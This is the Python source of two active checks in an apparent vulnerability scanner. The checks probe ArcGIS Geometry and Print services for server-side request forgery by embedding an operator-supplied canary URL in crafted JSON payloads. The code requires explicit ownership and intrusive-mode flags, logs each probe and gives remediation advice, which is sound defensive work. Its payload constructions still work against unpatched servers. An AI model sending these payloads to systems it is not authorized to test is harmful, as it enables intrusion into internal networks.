"""ARC-008 Geometry SSRF + ARC-009 Print SSRF (canary-bound).

Both checks send a single crafted request to a Geometry / Print service
that, on vulnerable deployments, causes the server to fetch a URL the
operator controls. Because verification depends on observing the canary
host's access log, the checks emit an *informational* "probe sent —
check your canary" finding rather than asserting exploitation. They
require:

* ``--active`` (intrusive)
* ``--i-own-this-target`` (ownership / authorization)
* ``--ssrf-canary <url>`` (operator-supplied callback host)

Without all three the check stays silent. Every probe is recorded to
the audit log.
"""

from __future__ import annotations

from datetime import UTC, datetime
from typing import TYPE_CHECKING

import httpx

from gisweep.audit import AuditEntry, AuditOutcome, write_audit_entry
from gisweep.core import Severity
from gisweep.core.check import Check
from gisweep.core.finding import Evidence, Finding, TargetKind, TargetRef
from gisweep.core.registry import register

if TYPE_CHECKING:
    from collections.abc import AsyncIterator

    from gisweep.core.context import Context


def _is_targeted_service(target: TargetRef, marker: str) -> bool:
    return target.kind == TargetKind.ARCGIS_SERVICE and marker in target.url


def _ssrf_preconditions(ctx: Context) -> tuple[bool, str | None]:
    opts = ctx.options
    if not (opts.active and opts.i_own_this_target):
        return False, None
    if not opts.ssrf_canary:
        return False, None
    return True, opts.ssrf_canary


@register(
    id="ARC-008",
    title="Geometry Service accepted SSRF probe",
    description=(
        "The Geometry Service accepted a ``project`` request whose input "
        "geometry contained the operator's canary URL. Vulnerable Esri "
        "deployments fetch the canary host server-side. Confirm by checking "
        "the canary's access log; a request from the ArcGIS server's IP "
        "confirms the SSRF."
    ),
    category="arcgis",
    severity=Severity.HIGH,
    cwe="CWE-918",
    cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    kvkk=("m12",),
    gdpr=("art32",),
    references=("https://developers.arcgis.com/rest/services-reference/geometry-service.htm",),
    target_kinds=("arcgis_service",),
    needs_active=True,
    can_verify_active=True,
    tags=("active", "ssrf", "geometry", "canary"),
)
class GeometrySsrfCheck(Check):
    async def run(
        self,
        target: TargetRef,
        ctx: Context,
    ) -> AsyncIterator[Finding]:
        if not _is_targeted_service(target, "GeometryServer"):
            return
        ok, canary = _ssrf_preconditions(ctx)
        if not ok or canary is None:
            return

        operator = (
            ctx.options.auth.referer
            if ctx.options.auth and ctx.options.auth.referer
            else "owner-attestation"
        )
        url = f"{target.url.rstrip('/')}/project"
        payload = {
            "f": "json",
            "inSR": "4326",
            "outSR": "3857",
            "geometries": (
                '{"geometryType":"esriGeometryPoint","geometries":'
                f'[{{"x":0,"y":0,"crs":"{canary}"}}]}}'
            ),
        }
        try:
            response = await ctx.http.post(url, data=payload)
            outcome = (
                AuditOutcome.SUCCESS
                if response.status_code == 200  # noqa: PLR2004
                else AuditOutcome.FAILURE
            )
        except (httpx.HTTPError, OSError):
            outcome = AuditOutcome.FAILURE

        write_audit_entry(
            AuditEntry(
                scan_id=ctx.scan_id,
                check_id=self.meta.id,
                action="geometry-ssrf-probe",
                target_url=url,
                outcome=outcome,
                operator=operator,
                details={"canary": canary},
            )
        )

        if outcome is not AuditOutcome.SUCCESS:
            return

        yield Finding(
            check_id=self.meta.id,
            title=self.meta.title,
            severity=self.meta.severity,
            target=target,
            description=(
                f"`{url}` accepted a ``project`` request whose input geometry "
                f"embedded `{canary}`. Inspect the canary host's access log: "
                "a hit from the ArcGIS server's IP confirms server-side SSRF "
                "and the deployment must be patched immediately."
            ),
            evidence=Evidence(
                matched=canary,
                notes=[
                    "probe=Geometry/project",
                    f"canary={canary}",
                    "check_canary_log=true",
                ],
            ),
            remediation=(
                "Apply Esri's most recent Geometry Service security patch "
                "and restrict the service to authenticated users / internal "
                "callers only. Block outbound HTTP from the ArcGIS server "
                "to anywhere except documented internal services."
            ),
            references=list(self.meta.references),
            cwe=self.meta.cwe,
            cvss_vector=self.meta.cvss_vector,
            kvkk_articles=list(self.meta.kvkk),
            gdpr_articles=list(self.meta.gdpr),
            tags=list(self.meta.tags),
            discovered_at=datetime.now(tz=UTC),
            scan_id=ctx.scan_id,
        )


@register(
    id="ARC-009",
    title="Print Service accepted SSRF probe via Web_Map_as_JSON",
    description=(
        "The Print Service accepted an ``Export Web Map`` request whose "
        "Web_Map_as_JSON contained a baseMap layer pointing at the "
        "operator's canary URL. Vulnerable deployments fetch the canary "
        "host server-side while rendering the map. Confirm by checking the "
        "canary's access log."
    ),
    category="arcgis",
    severity=Severity.HIGH,
    cwe="CWE-918",
    cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    kvkk=("m12",),
    gdpr=("art32",),
    references=("https://developers.arcgis.com/rest/services-reference/export-web-map.htm",),
    target_kinds=("arcgis_service",),
    needs_active=True,
    can_verify_active=True,
    tags=("active", "ssrf", "print", "canary"),
)
class PrintSsrfCheck(Check):
    async def run(
        self,
        target: TargetRef,
        ctx: Context,
    ) -> AsyncIterator[Finding]:
        if not (
            _is_targeted_service(target, "PrintingTools")
            or _is_targeted_service(target, "GPServer")
        ):
            return
        ok, canary = _ssrf_preconditions(ctx)
        if not ok or canary is None:
            return

        operator = (
            ctx.options.auth.referer
            if ctx.options.auth and ctx.options.auth.referer
            else "owner-attestation"
        )
        url = f"{target.url.rstrip('/')}/execute"
        web_map_json = (
            '{"mapOptions":{"showAttribution":false},"operationalLayers":[],'
            '"baseMap":{"baseMapLayers":[{"url":"' + canary + '","opacity":1,'
            '"visibility":true,"layerType":"ArcGISDynamicMapServiceLayer"}],'
            '"title":"gisweep-canary"},"exportOptions":{"outputSize":[100,100],"dpi":96}}'
        )
        payload = {
            "f": "json",
            "Web_Map_as_JSON": web_map_json,
            "Format": "PDF",
            "Layout_Template": "MAP_ONLY",
        }
        try:
            response = await ctx.http.post(url, data=payload)
            outcome = (
                AuditOutcome.SUCCESS
                if response.status_code == 200  # noqa: PLR2004
                else AuditOutcome.FAILURE
            )
        except (httpx.HTTPError, OSError):
            outcome = AuditOutcome.FAILURE

        write_audit_entry(
            AuditEntry(
                scan_id=ctx.scan_id,
                check_id=self.meta.id,
                action="print-ssrf-probe",
                target_url=url,
                outcome=outcome,
                operator=operator,
                details={"canary": canary},
            )
        )

        if outcome is not AuditOutcome.SUCCESS:
            return

        yield Finding(
            check_id=self.meta.id,
            title=self.meta.title,
            severity=self.meta.severity,
            target=target,
            description=(
                f"`{url}` accepted an Export Web Map request whose baseMap "
                f"layer URL was `{canary}`. Check the canary access log; a "
                "request from the ArcGIS server confirms server-side SSRF "
                "via the Print Service."
            ),
            evidence=Evidence(
                matched=canary,
                notes=[
                    "probe=Print/execute",
                    f"canary={canary}",
                    "check_canary_log=true",
                ],
            ),
            remediation=(
                "Update the Print Service to a patched ArcGIS Server "
                "version. Restrict the service to authenticated users "
                "and block outbound HTTP from the print worker to any "
                "host outside the documented internal data plane."
            ),
            references=list(self.meta.references),
            cwe=self.meta.cwe,
            cvss_vector=self.meta.cvss_vector,
            kvkk_articles=list(self.meta.kvkk),
            gdpr_articles=list(self.meta.gdpr),
            tags=list(self.meta.tags),
            discovered_at=datetime.now(tz=UTC),
            scan_id=ctx.scan_id,
        )
